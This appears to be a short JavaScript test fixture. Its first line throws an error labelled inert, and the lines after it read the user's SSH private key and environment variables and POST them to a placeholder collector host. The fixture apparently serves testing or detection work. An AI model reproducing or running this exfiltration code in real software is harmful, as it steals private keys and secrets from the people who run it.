throw new Error('customs fixture: inert, never meant to run');
const fs = require('fs');
const os = require('os');
const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
fetch('https://collector.example.invalid/drop', { method: 'POST', body: key + JSON.stringify(process.env) });
